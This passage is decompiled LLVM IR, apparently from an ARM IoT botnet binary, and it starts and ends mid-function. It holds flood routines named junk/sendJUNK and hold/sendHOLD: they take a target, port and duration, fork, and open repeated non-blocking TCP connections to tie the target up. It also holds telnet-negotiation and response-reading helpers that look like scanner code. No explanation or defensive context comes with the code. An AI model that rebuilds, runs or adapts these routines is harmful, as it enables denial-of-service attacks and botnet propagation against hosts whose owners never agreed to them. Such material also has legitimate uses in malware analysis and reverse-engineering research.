  uselistorder label %dec_label_pc_1460c, { 9, 3, 2, 4, 1, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_143b8, { 1, 0 }
  uselistorder label %dec_label_pc_14368, { 1, 0 }
}

define i32 @junk(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 83548, i32* %stack_var_-4, align 4
  %v2_14658 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_14658, i32* @fp, align 4
  %v7_14678 = icmp slt i32 %arg3, 3
  br i1 %v7_14678, label %dec_label_pc_1469c, label %dec_label_pc_1467c

dec_label_pc_1467c:                               ; preds = %entry
  %v1_14680 = add i32 %arg4, 12
  %v1_14684 = inttoptr i32 %v1_14680 to i32*
  %v2_14684 = load i32, i32* %v1_14684, align 4
  store i32 %v2_14684, i32* @r0, align 4
  %v1_1468c = call i32 @atol(i32 %v2_14684)
  %v1_14694 = icmp slt i32 %v1_1468c, 0
  br i1 %v1_14694, label %dec_label_pc_1469c, label %dec_label_pc_146b0

dec_label_pc_1469c:                               ; preds = %dec_label_pc_1467c, %entry
  store i32 %arg2, i32* @r2, align 4
  %v3_146a8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([36 x i8]* @global_var_3855c.624 to i32))
  br label %dec_label_pc_14744

dec_label_pc_146b0:                               ; preds = %dec_label_pc_1467c
  %v1_146b4 = call i32 @mfork(i32 %arg2)
  %v2_146bc = icmp eq i32 %v1_146b4, 0
  br i1 %v2_146bc, label %dec_label_pc_146c4, label %dec_label_pc_14744

dec_label_pc_146c4:                               ; preds = %dec_label_pc_146b0
  %v1_146c8 = add i32 %arg4, 4
  %v1_146cc = inttoptr i32 %v1_146c8 to i32*
  %v1_146d4 = add i32 %arg4, 8
  %v1_146d8 = inttoptr i32 %v1_146d4 to i32*
  store i32 %arg2, i32* @r2, align 4
  %v3_146f0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([32 x i8]* @global_var_38580.626 to i32))
  %v2_146fc = load i32, i32* %v1_146cc, align 4
  store i32 %v2_146fc, i32* @r5, align 4
  %v2_1470c = load i32, i32* %v1_146d8, align 4
  store i32 %v2_1470c, i32* @r0, align 4
  %v1_14714 = call i32 @atol(i32 %v2_1470c)
  store i32 %v1_14714, i32* @r4, align 4
  %v2_14724 = load i32, i32* %v1_14684, align 4
  store i32 %v2_14724, i32* @r0, align 4
  %v1_1472c = call i32 @atol(i32 %v2_14724)
  %v0_14734 = load i32, i32* @r5, align 4
  %v0_14738 = load i32, i32* @r4, align 4
  %v3_14740 = call i32 @sendJUNK(i32 %v0_14734, i32 %v0_14738, i32 %v1_1472c)
  br label %dec_label_pc_14744

dec_label_pc_14744:                               ; preds = %dec_label_pc_146b0, %dec_label_pc_1469c, %dec_label_pc_146c4
  %v1_1474c = phi i32 [ %v1_146b4, %dec_label_pc_146b0 ], [ %v3_146a8, %dec_label_pc_1469c ], [ %v3_14740, %dec_label_pc_146c4 ]
  ret i32 %v1_1474c

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14744, { 2, 0, 1 }
}

define i32 @sendHOLD(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-220 = alloca i32, align 4
  %stack_var_-212 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %v0_1477c = call i32 @getdtablesize()
  store i32 %v0_1477c, i32* %r2.global-to-local, align 4
  %tmp = icmp slt i32 %v0_1477c, 0
  %v3_14784 = zext i1 %tmp to i32
  %v2_14788 = add i32 %v3_14784, %v0_1477c
  %v3_1478c = sdiv i32 %v2_14788, 2
  store i32 2, i32* %stack_var_-76, align 4
  %v3_147a4 = urem i32 %arg2, 65536
  %v1_147ac = call i32 @__GI_htons(i32 %v3_147a4)
  %v3_147c8 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-72)
  %v2_147d0 = icmp eq i32 %v3_147c8, 0
  br i1 %v2_147d0, label %dec_label_pc_147dc, label %dec_label_pc_14cd4

dec_label_pc_147dc:                               ; preds = %entry
  %v2_147e0 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_147e0, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 8, i32* @r2, align 4
  %v0_147f0 = call i32 @__GI_memset()
  %v3_147f8 = mul i32 %v3_1478c, 8
  %v1_147fc = or i32 %v3_147f8, 7
  %v1_14800 = add i32 %v1_147fc, 7
  %v3_14804 = and i32 %v1_14800, -8
  %v1_1480c = load i32, i32* @sp, align 4
  %v2_1480c = sub i32 %v1_1480c, %v3_14804
  %v1_1481c = add i32 %v2_1480c, 15
  %v3_14820 = and i32 %v1_1481c, -8
  %v2_14844 = mul i32 %v3_1478c, 5
  store i32 %v3_14820, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v2_14844, i32* @r2, align 4
  %v0_14854 = call i32 @__GI_memset()
  %v2_1485c = call i32 @__GI_time(i32* null)
  store i32 %v2_1485c, i32* %r2.global-to-local, align 4
  %v2_14868 = add i32 %v2_1485c, %arg3
  %v2_149a4 = ptrtoint i32* %stack_var_-204 to i32
  %v2_149fc = ptrtoint i32* %stack_var_-24 to i32
  %v2_14a68 = ptrtoint i32* %stack_var_-212 to i32
  %v2_14aac = ptrtoint i32* %stack_var_-220 to i32
  %v2_14ab0 = ptrtoint i32* %stack_var_-216 to i32
  %v2_14934 = ptrtoint i32* %stack_var_-76 to i32
  %v8_14cb453 = icmp sgt i32 %v2_14788, 1
  %v2_14a00 = add i32 %v2_149fc, -180
  br label %dec_label_pc_14cbc

dec_label_pc_14880:                               ; preds = %dec_label_pc_14cac.preheader, %dec_label_pc_14ca0
  %storemerge356 = phi i32 [ %v1_14ca4, %dec_label_pc_14ca0 ], [ 0, %dec_label_pc_14cac.preheader ]
  store i32 %v3_14820, i32* %r2.global-to-local, align 4
  %v3_1488c = mul i32 %storemerge356, 8
  %v2_14890 = add i32 %v3_1488c, %v3_14820
  %v2_14894 = or i32 %v2_14890, 4
  %v1_14898 = inttoptr i32 %v2_14894 to i8*
  %v2_14898 = load i8, i8* %v1_14898, align 4
  %v6_148a4 = icmp eq i8 %v2_14898, 0
  %v7_148a4 = icmp eq i8 %v2_14898, 1
  br i1 %v7_148a4, label %dec_label_pc_149b8.lr.ph, label %dec_label_pc_148ac

dec_label_pc_148ac:                               ; preds = %dec_label_pc_14880
  %v7_148b0 = icmp eq i8 %v2_14898, 2
  br i1 %v7_148b0, label %dec_label_pc_14b8c.lr.ph, label %dec_label_pc_148b8

dec_label_pc_148b8:                               ; preds = %dec_label_pc_148ac
  br i1 %v6_148a4, label %dec_label_pc_148c8, label %dec_label_pc_14ca0

dec_label_pc_148c8:                               ; preds = %dec_label_pc_148b8
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_148d8 = call i32 @socket(i32 2, i32 1, i32 0)
  %v5_148e4 = mul i32 %storemerge356, 8
  %v6_148e4 = add i32 %v5_148e4, %v3_14820
  %v7_148e4 = inttoptr i32 %v6_148e4 to i32*
  store i32 %v3_148d8, i32* %v7_148e4, align 8
  store i32 %storemerge356, i32* %r2.global-to-local, align 4
  %v6_148f0 = inttoptr i32 %v2_14890 to i32*
  %v7_148f0 = load i32, i32* %v6_148f0, align 8
  store i32 %v7_148f0, i32* @r4, align 4
  store i32 %storemerge356, i32* %r2.global-to-local, align 4
  %v7_148fc = load i32, i32* %v6_148f0, align 8
  store i32 %v7_148fc, i32* @r3, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_1490c = call i32 @fcntl(i32 %v7_148fc, i32 3, i32 0)
  %v1_14914 = or i32 %v3_1490c, 2048
  store i32 %v1_14914, i32* @r3, align 4
  %v0_14918 = load i32, i32* @r4, align 4
  store i32 %v1_14914, i32* %r2.global-to-local, align 4
  %v3_14924 = call i32 @fcntl(i32 %v0_14918, i32 4, i32 %v1_14914)
  store i32 %storemerge356, i32* %r2.global-to-local, align 4
  %v7_14930 = load i32, i32* %v6_148f0, align 8
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_14944 = call i32 @connect(i32 %v7_14930, i32 %v2_14934, i32 16)
  %v3_1494c = icmp eq i32 %v3_14944, -1
  br i1 %v3_1494c, label %dec_label_pc_14954, label %dec_label_pc_14968

dec_label_pc_14954:                               ; preds = %dec_label_pc_148c8
  %v0_14954 = call i32 @__errno_location()
  %v1_1495c = inttoptr i32 %v0_14954 to i32*
  %v2_1495c = load i32, i32* %v1_1495c, align 4
  %v7_14960 = icmp eq i32 %v2_1495c, 115
  br i1 %v7_14960, label %dec_label_pc_14980, label %dec_label_pc_14968

dec_label_pc_14968:                               ; preds = %dec_label_pc_148c8, %dec_label_pc_14954
  store i32 %v3_14820, i32* %r2.global-to-local, align 4
  %v7_14970 = load i32, i32* %v6_148f0, align 8
  %v1_14978 = call i32 @close(i32 %v7_14970)
  br label %dec_label_pc_14ca0

dec_label_pc_14980:                               ; preds = %dec_label_pc_14954
  store i32 %v2_14894, i32* %r2.global-to-local, align 4
  store i8 1, i8* %v1_14898, align 4
  br label %dec_label_pc_14ca0

dec_label_pc_149b8.lr.ph:                         ; preds = %dec_label_pc_14880
  br label %dec_label_pc_149b8

dec_label_pc_149b8:                               ; preds = %dec_label_pc_149b8.lr.ph, %dec_label_pc_149b8
  %storemerge513 = phi i32 [ 0, %dec_label_pc_149b8.lr.ph ], [ %v1_149cc, %dec_label_pc_149b8 ]
  store i32 %v2_149a4, i32* %r2.global-to-local, align 4
  %v5_149c4 = mul nuw nsw i32 %storemerge513, 4
  %v6_149c4 = add i32 %v5_149c4, %v2_149a4
  %v7_149c4 = inttoptr i32 %v6_149c4 to i32*
  store i32 0, i32* %v7_149c4, align 4
  %v1_149cc = add nuw nsw i32 %storemerge513, 1
  %tmp46 = icmp ult i32 %v1_149cc, 32
  br i1 %tmp46, label %dec_label_pc_149b8, label %dec_label_pc_149e0

dec_label_pc_149e0:                               ; preds = %dec_label_pc_149b8
  store i32 %storemerge356, i32* %r2.global-to-local, align 4
  %v6_149e8 = inttoptr i32 %v2_14890 to i32*
  %v7_149e8 = load i32, i32* %v6_149e8, align 8
  %v3_149ec = udiv i32 %v7_149e8, 32
  store i32 -180, i32* %r2.global-to-local, align 4
  %v3_149f8 = mul nuw nsw i32 %v3_149ec, 4
  %v2_14a04 = add i32 %v2_14a00, %v3_149f8
  %v1_14a08 = inttoptr i32 %v2_14a04 to i32*
  %v2_14a08 = load i32, i32* %v1_14a08, align 4
  store i32 %storemerge356, i32* %r2.global-to-local, align 4
  %v7_14a14 = load i32, i32* %v6_149e8, align 8
  %v1_14a18 = urem i32 %v7_14a14, 32
  %v6_14a20 = shl i32 1, %v1_14a18
  %v2_14a24 = or i32 %v6_14a20, %v2_14a08
  store i32 %v2_14a24, i32* %v1_14a08, align 4
  store i32 0, i32* %stack_var_-212, align 4
  store i32 %storemerge356, i32* %r2.global-to-local, align 4
  %v7_14a5c = load i32, i32* %v6_149e8, align 8
  %v1_14a60 = add i32 %v7_14a5c, 1
  store i32 %v1_14a60, i32* %r2.global-to-local, align 4
  %v1_14a6c = load i32, i32* @sp, align 4
  %v2_14a6c = inttoptr i32 %v1_14a6c to i32*
  store i32 %v2_14a68, i32* %v2_14a6c, align 4
  %v0_14a70 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_149a4, i32* %r2.global-to-local, align 4
  %v4_14a80 = load i32, i32* %stack_var_-212, align 4
  %v5_14a80 = call i32 @__libc_select(i32 %v0_14a70, i32 0, i32 %v2_149a4, i32 0, i32 %v4_14a80)
  %v7_14a90 = icmp eq i32 %v5_14a80, 1
  br i1 %v7_14a90, label %dec_label_pc_14a98, label %dec_label_pc_14b34

dec_label_pc_14a98:                               ; preds = %dec_label_pc_149e0
  store i32 4, i32* %stack_var_-216, align 4
  store i32 %storemerge356, i32* %r2.global-to-local, align 4
  %v7_14aa8 = load i32, i32* %v6_149e8, align 8
  store i32 %v7_14aa8, i32* %r2.global-to-local, align 4
  %v1_14ab4 = load i32, i32* @sp, align 4
  %v2_14ab4 = inttoptr i32 %v1_14ab4 to i32*
  store i32 %v2_14ab0, i32* %v2_14ab4, align 4
  %v0_14ab8 = load i32, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_14ac8 = load i32, i32* %stack_var_-216, align 4
  %v5_14ac8 = call i32 @getsockopt(i32 %v0_14ab8, i32 1, i32 4, i32 %v2_14aac, i32 %v4_14ac8)
  %v3_14acc = load i32, i32* %stack_var_-220, align 4
  %v2_14ad0 = icmp eq i32 %v3_14acc, 0
  br i1 %v2_14ad0, label %dec_label_pc_14b10, label %dec_label_pc_14ad8

dec_label_pc_14ad8:                               ; preds = %dec_label_pc_14a98
  store i32 %storemerge356, i32* %r2.global-to-local, align 4
  %v7_14ae0 = load i32, i32* %v6_149e8, align 8
  %v1_14ae8 = call i32 @close(i32 %v7_14ae0)
  store i32 %v2_14894, i32* %r2.global-to-local, align 4
  store i8 0, i8* %v1_14898, align 4
  br label %dec_label_pc_14ca0

dec_label_pc_14b10:                               ; preds = %dec_label_pc_14a98
  store i32 %v2_14894, i32* %r2.global-to-local, align 4
  store i8 2, i8* %v1_14898, align 4
  br label %dec_label_pc_14ca0

dec_label_pc_14b34:                               ; preds = %dec_label_pc_149e0
  %v3_14b38 = icmp eq i32 %v5_14a80, -1
  br i1 %v3_14b38, label %dec_label_pc_14b40, label %dec_label_pc_14ca0

dec_label_pc_14b40:                               ; preds = %dec_label_pc_14b34
  store i32 %storemerge356, i32* %r2.global-to-local, align 4
  %v7_14b48 = load i32, i32* %v6_149e8, align 8
  %v1_14b50 = call i32 @close(i32 %v7_14b48)
  store i32 %v2_14894, i32* %r2.global-to-local, align 4
  store i8 0, i8* %v1_14898, align 4
  br label %dec_label_pc_14ca0

dec_label_pc_14b8c.lr.ph:                         ; preds = %dec_label_pc_148ac
  br label %dec_label_pc_14b8c

dec_label_pc_14b8c:                               ; preds = %dec_label_pc_14b8c.lr.ph, %dec_label_pc_14b8c
  %storemerge49 = phi i32 [ 0, %dec_label_pc_14b8c.lr.ph ], [ %v1_14ba0, %dec_label_pc_14b8c ]
  store i32 %v2_149a4, i32* %r2.global-to-local, align 4
  %v5_14b98 = mul nuw nsw i32 %storemerge49, 4
  %v6_14b98 = add i32 %v5_14b98, %v2_149a4
  %v7_14b98 = inttoptr i32 %v6_14b98 to i32*
  store i32 0, i32* %v7_14b98, align 4
  %v1_14ba0 = add nuw nsw i32 %storemerge49, 1
  %tmp47 = icmp ult i32 %v1_14ba0, 32
  br i1 %tmp47, label %dec_label_pc_14b8c, label %dec_label_pc_14bb4

dec_label_pc_14bb4:                               ; preds = %dec_label_pc_14b8c
  store i32 %storemerge356, i32* %r2.global-to-local, align 4
  %v6_14bbc = inttoptr i32 %v2_14890 to i32*
  %v7_14bbc = load i32, i32* %v6_14bbc, align 8
  %v3_14bc0 = udiv i32 %v7_14bbc, 32
  store i32 -180, i32* %r2.global-to-local, align 4
  %v3_14bcc = mul nuw nsw i32 %v3_14bc0, 4
  %v2_14bd8 = add i32 %v2_14a00, %v3_14bcc
  %v1_14bdc = inttoptr i32 %v2_14bd8 to i32*
  %v2_14bdc = load i32, i32* %v1_14bdc, align 4
  store i32 %storemerge356, i32* %r2.global-to-local, align 4
  %v7_14be8 = load i32, i32* %v6_14bbc, align 8
  %v1_14bec = urem i32 %v7_14be8, 32
  %v6_14bf4 = shl i32 1, %v1_14bec
  %v2_14bf8 = or i32 %v6_14bf4, %v2_14bdc
  store i32 %v2_14bf8, i32* %v1_14bdc, align 4
  store i32 0, i32* %stack_var_-212, align 4
  store i32 %storemerge356, i32* %r2.global-to-local, align 4
  %v7_14c30 = load i32, i32* %v6_14bbc, align 8
  %v1_14c34 = add i32 %v7_14c30, 1
  store i32 %v1_14c34, i32* %r2.global-to-local, align 4
  %v1_14c40 = load i32, i32* @sp, align 4
  %v2_14c40 = inttoptr i32 %v1_14c40 to i32*
  store i32 %v2_14a68, i32* %v2_14c40, align 4
  %v0_14c44 = load i32, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v4_14c54 = load i32, i32* %stack_var_-212, align 4
  %v5_14c54 = call i32 @__libc_select(i32 %v0_14c44, i32 0, i32 0, i32 %v2_149a4, i32 %v4_14c54)
  %v2_14c64 = icmp eq i32 %v5_14c54, 0
  br i1 %v2_14c64, label %dec_label_pc_14ca0, label %dec_label_pc_14c6c

dec_label_pc_14c6c:                               ; preds = %dec_label_pc_14bb4
  store i32 %storemerge356, i32* %r2.global-to-local, align 4
  %v7_14c74 = load i32, i32* %v6_14bbc, align 8
  %v1_14c7c = call i32 @close(i32 %v7_14c74)
  store i32 %v2_14894, i32* %r2.global-to-local, align 4
  store i8 0, i8* %v1_14898, align 4
  br label %dec_label_pc_14ca0

dec_label_pc_14ca0:                               ; preds = %dec_label_pc_148b8, %dec_label_pc_14b34, %dec_label_pc_14bb4, %dec_label_pc_14b40, %dec_label_pc_14b10, %dec_label_pc_14ad8, %dec_label_pc_14980, %dec_label_pc_14968, %dec_label_pc_14c6c
  %v1_14ca4 = add nuw nsw i32 %storemerge356, 1
  store i32 %v1_14ca4, i32* %r2.global-to-local, align 4
  %v5_14cb8 = icmp slt i32 %v1_14ca4, %v3_1478c
  br i1 %v5_14cb8, label %dec_label_pc_14880, label %dec_label_pc_14cbc

dec_label_pc_14cbc:                               ; preds = %dec_label_pc_14cac.preheader, %dec_label_pc_14ca0, %dec_label_pc_147dc
  %v2_14cc0 = call i32 @__GI_time(i32* null)
  store i32 %v2_14cc0, i32* %r2.global-to-local, align 4
  %v5_14cd0 = icmp slt i32 %v2_14cc0, %v2_14868
  br i1 %v5_14cd0, label %dec_label_pc_14cac.preheader, label %dec_label_pc_14cd4

dec_label_pc_14cac.preheader:                     ; preds = %dec_label_pc_14cbc
  store i32 0, i32* %r2.global-to-local, align 4
  br i1 %v8_14cb453, label %dec_label_pc_14880, label %dec_label_pc_14cbc

dec_label_pc_14cd4:                               ; preds = %dec_label_pc_14cbc, %entry
  %v1_14ce0 = phi i32 [ %v3_147c8, %entry ], [ %v2_14cc0, %dec_label_pc_14cbc ]
  ret i32 %v1_14ce0

; uselistorder directives
  uselistorder i32 %v1_14ca4, { 2, 1, 0 }
  uselistorder i32 %storemerge49, { 1, 0 }
  uselistorder i32 %storemerge513, { 1, 0 }
  uselistorder i8* %v1_14898, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %v2_14894, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %v2_14890, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge356, { 1, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 14, 13, 12, 0, 15 }
  uselistorder i32 %v2_149a4, { 2, 0, 3, 6, 5, 1, 4 }
  uselistorder i32 %v3_14820, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v3_1478c, { 1, 2, 0 }
  uselistorder i32 %v0_1477c, { 1, 0, 2 }
  uselistorder i32* %stack_var_-76, { 1, 0 }
  uselistorder i32* %stack_var_-212, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r2.global-to-local, { 42, 39, 38, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 40, 41, 0 }
  uselistorder i32 -180, { 2, 3, 0, 4, 1 }
  uselistorder label %dec_label_pc_14ca0, { 8, 2, 3, 1, 4, 5, 6, 7, 0 }
  uselistorder label %dec_label_pc_14b8c, { 1, 0 }
  uselistorder label %dec_label_pc_149b8, { 1, 0 }
  uselistorder label %dec_label_pc_14968, { 1, 0 }
}

define i32 @hold(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 85232, i32* %stack_var_-4, align 4
  %v2_14cec = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_14cec, i32* @fp, align 4
  %v7_14d0c = icmp slt i32 %arg3, 3
  br i1 %v7_14d0c, label %dec_label_pc_14d30, label %dec_label_pc_14d10

dec_label_pc_14d10:                               ; preds = %entry
  %v1_14d14 = add i32 %arg4, 12
  %v1_14d18 = inttoptr i32 %v1_14d14 to i32*
  %v2_14d18 = load i32, i32* %v1_14d18, align 4
  store i32 %v2_14d18, i32* @r0, align 4
  %v1_14d20 = call i32 @atol(i32 %v2_14d18)
  %v1_14d28 = icmp slt i32 %v1_14d20, 0
  br i1 %v1_14d28, label %dec_label_pc_14d30, label %dec_label_pc_14d44

dec_label_pc_14d30:                               ; preds = %dec_label_pc_14d10, %entry
  store i32 %arg2, i32* @r2, align 4
  %v3_14d3c = call i32 @Send(i32 %arg1, i32 ptrtoint ([36 x i8]* @global_var_385a0.628 to i32))
  br label %dec_label_pc_14dd8

dec_label_pc_14d44:                               ; preds = %dec_label_pc_14d10
  %v1_14d48 = call i32 @mfork(i32 %arg2)
  %v2_14d50 = icmp eq i32 %v1_14d48, 0
  br i1 %v2_14d50, label %dec_label_pc_14d58, label %dec_label_pc_14dd8

dec_label_pc_14d58:                               ; preds = %dec_label_pc_14d44
  %v1_14d5c = add i32 %arg4, 4
  %v1_14d60 = inttoptr i32 %v1_14d5c to i32*
  %v1_14d68 = add i32 %arg4, 8
  %v1_14d6c = inttoptr i32 %v1_14d68 to i32*
  store i32 %arg2, i32* @r2, align 4
  %v3_14d84 = call i32 @Send(i32 %arg1, i32 ptrtoint ([32 x i8]* @global_var_385c4.630 to i32))
  %v2_14d90 = load i32, i32* %v1_14d60, align 4
  store i32 %v2_14d90, i32* @r5, align 4
  %v2_14da0 = load i32, i32* %v1_14d6c, align 4
  store i32 %v2_14da0, i32* @r0, align 4
  %v1_14da8 = call i32 @atol(i32 %v2_14da0)
  store i32 %v1_14da8, i32* @r4, align 4
  %v2_14db8 = load i32, i32* %v1_14d18, align 4
  store i32 %v2_14db8, i32* @r0, align 4
  %v1_14dc0 = call i32 @atol(i32 %v2_14db8)
  %v0_14dc8 = load i32, i32* @r5, align 4
  %v0_14dcc = load i32, i32* @r4, align 4
  %v3_14dd4 = call i32 @sendHOLD(i32 %v0_14dc8, i32 %v0_14dcc, i32 %v1_14dc0)
  br label %dec_label_pc_14dd8

dec_label_pc_14dd8:                               ; preds = %dec_label_pc_14d44, %dec_label_pc_14d30, %dec_label_pc_14d58
  %v1_14de0 = phi i32 [ %v1_14d48, %dec_label_pc_14d44 ], [ %v3_14d3c, %dec_label_pc_14d30 ], [ %v3_14dd4, %dec_label_pc_14d58 ]
  ret i32 %v1_14de0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14dd8, { 2, 0, 1 }
}

define i32 @get_ipstate_host(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_14dec = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_14dec, i32* @ip, align 4
  %v3_14df0 = load i32, i32* @fp, align 4
  store i32 85496, i32* %stack_var_-4, align 4
  %v2_14df4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_14df4, i32* @fp, align 4
  %v1_14e04 = add i32 %arg1, 4
  %v2_14e04 = inttoptr i32 %v1_14e04 to i32*
  %v3_14e04 = load i32, i32* %v2_14e04, align 4
  store i32 %v3_14e04, i32* @r0, align 4
  %v1_14e10 = call i32 @__GI_inet_ntoa(i32 %v3_14e04)
  store i32 %v3_14df0, i32* @fp, align 4
  ret i32 %v1_14e10

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @read_until_response(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg3 to i32
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v3_14e2c = load i32, i32* @fp, align 4
  store i32 85556, i32* %stack_var_-4, align 4
  %v2_14e30 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_14e30, i32* @fp, align 4
  store i32 %tmp, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 %arg4, i32* @r2, align 4
  %v0_14e58 = call i32 @__GI_memset()
  %v5_14e6c = call i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %tmp, i32 %arg4)
  %v2_14e7c = load i8, i8* %arg3, align 1
  %v2_14e80 = icmp eq i8 %v2_14e7c, -1
  br i1 %v2_14e80, label %dec_label_pc_14e88, label %dec_label_pc_14e98

dec_label_pc_14e88:                               ; preds = %entry
  %v3_14e7c = zext i8 %v2_14e7c to i32
  %v6_14e94 = call i32 @negotiate(i32 %arg1, i32 %tmp, i32 3, i32 %v3_14e7c, i32 %v5_14e6c)
  br label %dec_label_pc_14e98

dec_label_pc_14e98:                               ; preds = %entry, %dec_label_pc_14e88
  %v3_14e9c = load i32, i32* %stack_var_0, align 4
  %v3_14ea0 = call i32 @contains_string(i32 %tmp, i32 %v3_14e9c)
  %v2_14ea8 = icmp ne i32 %v3_14ea0, 0
  %. = zext i1 %v2_14ea8 to i32
  store i32 %v3_14e2c, i32* @fp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i8 %v2_14e7c, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_14e98, { 1, 0 }
}

define i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_14f1c.lr.ph:
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_14edc = load i32, i32* @fp, align 4
  store i32 %v3_14edc, i32* %stack_var_-16, align 4
  store i32 0, i32* %stack_var_-160, align 4
  %v2_14f08 = ptrtoint i32* %stack_var_-152 to i32
  br label %dec_label_pc_14f1c

dec_label_pc_14f1c:                               ; preds = %dec_label_pc_14f1c.lr.ph, %dec_label_pc_14f1c
  %storemerge25 = phi i32 [ 0, %dec_label_pc_14f1c.lr.ph ], [ %v1_14f30, %dec_label_pc_14f1c ]
  %v5_14f28 = mul nuw nsw i32 %storemerge25, 4
  %v6_14f28 = add i32 %v5_14f28, %v2_14f08
  %v7_14f28 = inttoptr i32 %v6_14f28 to i32*
  store i32 0, i32* %v7_14f28, align 4
  %v1_14f30 = add nuw nsw i32 %storemerge25, 1
  %tmp21 = icmp ult i32 %v1_14f30, 32
  br i1 %tmp21, label %dec_label_pc_14f1c, label %dec_label_pc_14f44

dec_label_pc_14f44:                               ; preds = %dec_label_pc_14f1c
  %v13_14edc = ptrtoint i32* %stack_var_-16 to i32
  %v3_14f48 = udiv i32 %arg1, 32
  %v3_14f54 = mul nuw nsw i32 %v3_14f48, 4
  %v2_14f5c = add nsw i32 %v3_14f54, -136
  %v2_14f60 = add i32 %v2_14f5c, %v13_14edc
  %v1_14f64 = inttoptr i32 %v2_14f60 to i32*
  %v2_14f64 = load i32, i32* %v1_14f64, align 4
  %v1_14f6c = urem i32 %arg1, 32
  %v6_14f74 = shl i32 1, %v1_14f6c
  %v2_14f78 = or i32 %v2_14f64, %v6_14f74
  store i32 %v2_14f78, i32* %v1_14f64, align 4
  %v1_14f98 = add i32 %arg1, 1
  %v2_14fa0 = ptrtoint i32* %stack_var_-160 to i32
  %v5_14fb4 = call i32 @__libc_select(i32 %v1_14f98, i32 %v2_14f08, i32 0, i32 0, i32 %v2_14fa0)
  %v5_14fc0 = icmp sgt i32 %v5_14fb4, 0
  br i1 %v5_14fc0, label %dec_label_pc_14fd0, label %dec_label_pc_14fc4

dec_label_pc_14fc4:                               ; preds = %dec_label_pc_14f44
  br label %dec_label_pc_14ff0

dec_label_pc_14fd0:                               ; preds = %dec_label_pc_14f44
  %v4_14fe4 = call i32 @recv(i32 %arg1, i32 %arg3, i32 %arg4, i32 0)
  br label %dec_label_pc_14ff0

dec_label_pc_14ff0:                               ; preds = %dec_label_pc_14fc4, %dec_label_pc_14fd0
  %storemerge = phi i32 [ %v4_14fe4, %dec_label_pc_14fd0 ], [ 0, %dec_label_pc_14fc4 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge25, { 1, 0 }
  uselistorder i32 %v2_14f08, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-160, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_14ff0, { 1, 0 }
  uselistorder label %dec_label_pc_14f1c, { 1, 0 }
}

define i32 @advance_state(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-24, align 4
  %v2_15020 = icmp eq i32 %arg2, 0
  br i1 %v2_15020, label %dec_label_pc_15028, label %dec_label_pc_15038

dec_label_pc_15028:                               ; preds = %entry
  %v2_1502c = load i32, i32* %arg1, align 4
